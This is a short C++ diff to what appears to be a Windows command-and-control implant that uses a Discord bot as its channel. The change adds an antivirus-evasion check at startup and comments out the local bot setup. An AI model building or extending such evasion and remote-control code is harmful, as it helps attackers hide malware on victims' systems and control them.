@@ -5,13 +5,14 @@
 #pragma comment(lib, "userenv.lib")
 #pragma comment(lib, "ws2_32.lib")
 
+#include "./Communication/discord_bot/discord_bot.h"
 #include "./ConfigManager/Config.h"
 #include "./src/CommandsAndControll.h"
 #include "./src/ModuleLoading.h"
 #include "./src/FunctionPointer.h"
 #include "./src/Util.h"
 #include "./src/Types.h"
-#include "./Communication/discord_bot/discord_bot.h"
+#include "./src/AV-Evasion.h"
 
 //Global variables
 FunctionPointer get_message_pointer;
@@ -20,7 +21,7 @@ std::unordered_map<std::string, ModuleStruct> modules;
 
 static int set_required_functions(const bool& local) {
     if (local) {
-        get_message_pointer.setDirect(reinterpret_cast<FARPROC>(get_message));
+        /*get_message_pointer.setDirect(reinterpret_cast<FARPROC>(get_message));
         get_message_pointer.function_type = FunctionType::SINGLE;
         get_message_pointer.calling_type = CallingType::MANUAL;
         get_message_pointer.return_type = ValueType::CHAR_TYPE;
@@ -32,7 +33,7 @@ static int set_required_functions(const bool& local) {
         start_bot_pointer.calling_type = CallingType::MANUAL;
         start_bot_pointer.return_type = ValueType::NONE_TYPE;
         start_bot_pointer.argCount = 0;
-        start_bot_pointer.autoCall();
+        start_bot_pointer.autoCall();*/
     }
     else {
         get_message_pointer = findFunction(modules, "discord_bot.dll", "get_message").fp;
@@ -67,7 +68,9 @@ static void loop() {
     }
 }
 int main() {
-    Sleep(2000);
+    if (evade()) {
+        return 0;
+    }
     modules = getExtensions();
     for (const auto& [moduleName, moduleStruct] : modules) {
         startup(moduleStruct.functions);
